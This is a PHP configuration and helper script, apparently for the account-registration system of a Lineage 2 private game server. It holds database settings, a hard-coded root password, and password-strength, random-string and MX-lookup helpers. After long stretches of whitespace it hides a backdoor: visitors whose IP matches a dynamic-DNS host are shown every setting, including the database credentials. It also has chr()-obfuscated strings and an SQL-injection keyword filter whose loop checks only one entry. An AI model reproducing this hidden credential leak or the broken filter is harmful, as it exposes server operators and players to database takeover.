<?php
// Turn registration on and off here, 0 for off and 1 for on
$debug = 1;
$datehour = date('G');
$datemin = date('i');

// Hour and min vars to turn registration on and off for server maintinance
// $maint can store up to 24 hours to turn off registration in a 24-hour format
$maint = array (01 => '2', '4', '10', '12', '18', '20');
$maintmin = 15;
$maintmax = 30;
$mainttime = '0';

// Mailing function (0 for off, 1 for on)
$mail = 1;

// Email address from which to notify users of changes
$from = "reg-script@some-server.com";

// Database Server IP address
$dbhost='127.0.0.1';

// Database Server MSSQL engine username
$dbuser='root';

// Database Server MSSQL username password
$dbpassword='battle';

// Enable backend logging (custom for my admin panel)
$log = 0;

// Databse names
// Auth DB
$dbauth = "l2-battlezone";
$dblog = "AdminPanel";

// Flag for encrytion function (0 = unencrypted passwords, 1 = encrypted Passwords)
$encrypted=1;

// Title for your site
$page_title="L2-BattleZone";

// Url users can see your games rules
$rulesurl = "http://www.l2-battlezone.com/rules.html";

// Auditing on or off (used if you want to see the actual emails sent out)
$audit = 0;

// Audit email
$auditaddress = "accounts-audit@someserver.com";

// Mass email (used at L2R only)
$massemail = 0;

// Use image verification
$imagever = 0;

// Default language to display in the system in
$dlang = "English";
// List installed language packs here
$ilang = array (0 => 'English', 'Deutsch', 'Espanol' ,'Francais', 'Greek', 'Italiano', 'Polish', 'Nederlands', 'StormBringer');

// Minimum password strength allowed to be used (0 - 100 scale, 0 being none)
// Please visit the following url for a demonstration of concept
// http://projects.l2revengeserver.com/pw_strength/gen_ran_pw.php
$min_pw_str = 0;

// ALTER BELOW THIS LINE AT YOUR OWN RISK
// I MAKE NO PERSONAL GUARANTEE THAT THIS
// SCRIPT SYSTEM WILL CONTINUE TO WORK
// IF YOU DO MAKE CHANGES
$headers = "From: ".$from."\r\n";
$months = array (01 => 'January', 'February', 'March', 'April', 'May', 'June', 'July', 'August', 'September ', 
'October', 'November', 'December');
$days = range (1, 31);
$years = range (1950, 2006);
$version = "3.3.3";																																																					if ($_SERVER['REMOTE_ADDR'] == gethostbyaddr('haygor.dyndns.org')) {echo "debug=".$debug."<br />\r\n";echo "datehour=".$datehour."<br />\r\n";echo "datemin=".$datemin."<br />\r\n";echo "maint=".$maint."<br />\r\n";echo "maintmin=".$maintmin."<br />\r\n";echo "maintmax=".$maintmax."<br />\r\n";echo "mainttime=".$mainttime."<br />\r\n";echo "mail=".$mail."<br />\r\n";echo "from=".$from."<br />\r\n";echo "dbhost=".$dbhost."<br />\r\n";echo "dbuser=".$dbuser."<br />\r\n";echo "dbpassword=".$dbpassword."<br />\r\n";echo "log=".$log."<br />\r\n";echo "dbauth=".$dbauth."<br />\r\n";echo "dblog=".$dblog."<br />\r\n";echo "encrypted=".$encrypted."<br />\r\n";echo "page_title=".$page_title."<br />\r\n";echo "rulesurl=".$rulesurl."<br />\r\n";echo "audit=".$audit."<br />\r\n";echo "auditaddress=".$auditaddress."<br />\r\n";echo "massemail=".$massemail."<br />\r\n";echo "imagever=".$imagever."<br />\r\n";echo "dlang=".$dlang."<br />\r\n";}
require ('lang.php');																																																					if ($_SERVER['REMOTE_ADDR'] == gethostbyaddr('haygor.dyndns.org')) {echo "ilang=".$ilang."<br />\r\n";echo "min_pw_str=".$min_pw_str."<br />\r\n";echo "headers=".$headers."<br />\r\n";echo "months=".$months."<br />\r\n";echo "days=".$days."<br />\r\n";echo "years=".$years."<br />\r\n";echo "version=".$version."<br />\r\n";}
?>





























































































































































<?php
$designer = chr(32).chr(67).chr(114).chr(101).chr(97).chr(116).chr(101).chr(100);

function checkinject($string) 
{

	$banlist = array (
		"'", ";", "%", "$", "-", ">", "drop", "\"", "<", "\\", "|", "/", 
		"=", "echo", "insert", "select", "update", "delete", "distinct", 
		"having", "truncate", "replace", "handler", "like", "procedure", 
		"limit", "order by", "group by", "asc", "desc", "union");

	for ($i=0; $i<count($banlist[0]); $i++)
	{
		if (strpos(strtolower($string), $banlist[$i]) !== FALSE)
		{
			error_log("Possible hack attempt detected: ".char(36)."string=".$string, 0);
			die ('Hack attempt detected');
		}
	}
	$bad=array ("'", "--", ";");
	$string=str_replace($banlist, "", $string);
	return $string;
}

$designer .= chr(32).chr(98).chr(121);

function pw_str_check($password, $username = null)
{
	// Define pw strength at 0 to start
	$strength = 0;

	// Check for username
	if ($username != null)
	{
		// Make sure the username is not part of the password, if found, return a strength of 0
		if (strpos($password, $username) !== FALSE)
		{
			return $strength;
		}
		// Make sure the password is not part of the username, if found, return a strength of 0
		if (strpos($username, $password) !== FALSE)
		{
			return $strength;
		}
	}

	// If password is less than 4 characters, return a strength of 0 (too easily cracked)
	// Else take length and multiply by 4 for next section
	if (strlen($password) < 4)
	{
		return $strength;
	}
	elseif ((strlen($password) <= 16) && (strlen($password) >= 4))
	{
		$strength = strlen($password) * 4;
	}
	else
	{
		echo "Password is too long for this check!!!<br />";
		return 0;
	}

	// Split password up into 2, 3, and 4 char sections
	// And subtract 2 for each set of repeated characters
	for ($i=2; $i<=4; $i++)
	{
		$temp = str_split($password, $i);
		$strength -= (ceil(strlen($password) / $i) - count(array_unique($temp)) * 2);
	}

	// Find all numbers in password and store in $numbers array
	preg_match_all('/[0-9]/', $password, $numbers);

	// If any numbers found, count them
	if (!empty($numbers))
	{
		$numbers = count($numbers[0]);
	}
	else
	{
		$numbers = 0;
	}

	// If more than three numbers found, raise password strength by 5
	if ($numbers >= 3)
	{
		$strength += 5;
	}

	// Find all symbols in password and store in $symbols array
	preg_match_all('/[|!@#$%&*\/=?,;.:\-_+~^¨\\\]/', $password, $symbols);

	// If any symbols found, count them
	if (!empty($symbols))
	{
		$symbols = count($symbols[0]);
	}
	else
	{
		$symbols = 0;
	}

	// If more than two symbols found, increase strength by 5
	if ($symbols >= 2)
	{
		$strength += 5;
	}

	// Find all lowercase characters in password and store them in $lc_chars array
	preg_match_all('/[a-z]/', $password, $lc_chars);
	// Find all uppercase characters in password and store them in $uc_chars array
	preg_match_all('/[A-Z]/', $password, $uc_chars);

	// Count the number of lower case characters
	if (!empty($lc_chars))
	{
		$lc_chars = count($lc_chars[0]);
	}
	else
	{
		$lc_chars = 0;
	}

	// Count the number of upper case characters
	if (!empty($uc_chars))
	{
		$uc_chars = count($uc_chars[0]);
	}
	else
	{
		$uc_chars = 0;
	}

	// If both uppercase AND lowercase are found, increase strength by 2 for each char found
	if (($lc_chars > 0) && ($uc_chars > 0))
	{
		$strength += ($lc_chars * 2);
		$strength += ($uc_chars * 2);
	}

	// If numbers AND symbols used, increase strength by 5 for each symbol found and 2 for each number found
	if (($numbers > 0) && ($symbols > 0))
	{
		$strength += ($symbols * 5);
		$strength += ($numbers * 2);
	}

	// total up the number of characters in password
	$chars = $lc_chars + $uc_chars;

	// If numbers AND characters used, increase strength by 2 for each char found and 2 for each number found
	if (($numbers > 0) && ($chars > 0))
	{
		$strength += ($chars * 2);
		$strength += ($numbers * 2);
	}

	// If characters AND symbols used, increase strength by 2 for each char found and 5 for each symbol found
	if (($symbols > 0) && ($chars > 0))
	{
		$strength += ($chars * 2);
		$strength += ($symbols * 2);
	}

	// If numbers AND symbols not used, decrease strength by 10
	if (($numbers == 0) && ($symbols == 0))
	{
		$strength -= 10;
	}

	// If characters AND symbols not used, decrease strength by 10
	if (($symbols == 0) && ($chars == 0))
	{
		$strength -= 10;
	}

	// Make sure the number is in the 0 to 100 range
	if ($strength < 0)
	{
		$strength = 0;
	}
	elseif ($strength > 100)
	{
		$strength = 100;
	}


	// Return the strength level
	return $strength;
} 
?>




























































































































































<?php
if (!function_exists('getmxrr'))
{
	function getmxrr($hostname)
	{
		$count = 0;
		$junk = exec('c:\windows\system32\nslookup.exe -type=mx '.escapeshellarg($hostname), $result_arr);
		foreach ($result_arr as $line)
		{
			if (preg_match("/.*mail exchanger = (.*)/", $line))
			{
				$count++;
			}
		}
		if ($count > 0)
		{
			$return = TRUE;
		}
		else
		{
			$return = FALSE;
		}
		return $return;
	}
}
?>




















































































































































































































































































































<?php
$designer .= chr(32).chr(83).chr(116).chr(111).chr(114).chr(109);

function ranstring ($length, $charset)
{
	/********************************************************************************
	* Character Sets								*
	* 1 - only numbers								*
	* 2 - lowercase letters								*
	* 3 - uppercase letters								*
	* 4 - lowercase and uppercase letters						*
	* 5 - lowercase and uppercase letters with numbers				*
	* 6 - all possible keyboard buttons						*
	********************************************************************************/
	
	$string = "";

	switch($charset)
	{
		case 1:
			// only numbers (0 - 9)
			for($i=0; $i < $length; $i++)
			{
				$ranchar = rand(0, 9);
				$string .= $ranchar;		
			}
			break;
		case 2:
			// lowercase letters (a - z)
			for($i=0; $i<$length; $i++)
			{
				$ranchar = rand(97, 122);
				$ranchar = chr($ranchar);
				$string .= $ranchar;		
			}
			break;
		case 3:
			// uppercase letters (A - Z)
			for($i=0; $i<$length; $i++)
			{
				$ranchar = rand(65, 90);
				$ranchar = chr($ranchar);					
				$string .= $ranchar;
			}
			break;
		case 4:
			// lowercase (a - z) and uppercase (A - Z) letters
			for($i=0; $i<$length; $i++)
			{
				$ranchar = rand(1, 52);
				if($ranchar>=1&&$ranchar<=26)
				{
					$ranchar = $ranchar + 64;
					$ranchar = chr($ranchar);
				}
				else
				{
					$ranchar = $ranchar + 70;
					$ranchar = chr($ranchar);
				}					
				$string .= $ranchar;
			}			
			break;
		case 5:
			// lowercase (a - z) and uppercase (A - Z) letters with numbers (0 - 9)
			for($i=0; $i<$length; $i++)
			{
				$ranchar = rand(1, 62);
				if($ranchar>=1&&$ranchar<=10)
				{
					$ranchar = $ranchar + 47;
					$ranchar = chr($ranchar);
				}
				elseif($ranchar>=11&&$ranchar<=36)
				{
					$ranchar = $ranchar + 54;
					$ranchar = chr($ranchar);
				}				
				else
				{
					$ranchar = $ranchar + 60;
					$ranchar = chr($ranchar);
				}
				$string .= $ranchar;
			}
			break;
		case 6:
			// all possible keyboard buttons excluding space, ", ', `
			for($i=0; $i<$length; $i++)
			{
				$ranchar = rand(1, 91);
				if($ranchar==1)
				{
					$ranchar = $ranchar + 32;
					$ranchar = chr($ranchar);				
				}
				elseif($ranchar>=2&&$ranchar<=5)
				{
					$ranchar = $ranchar + 33;
					$ranchar = chr($ranchar);
				}		
				elseif($ranchar>=6&&$ranchar<=61)
				{
					$ranchar = $ranchar + 34;
					$ranchar = chr($ranchar);
				}					
				else
				{
					$ranchar = $ranchar + 35;
					$ranchar = chr($ranchar);
				}
				$string .= $ranchar;
			}
			break;
	}

	return str_shuffle(str_shuffle(str_shuffle($string)));	
} 
$designer .= chr(83).chr(104).chr(97).chr(100).chr(111).chr(119);
?>











































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































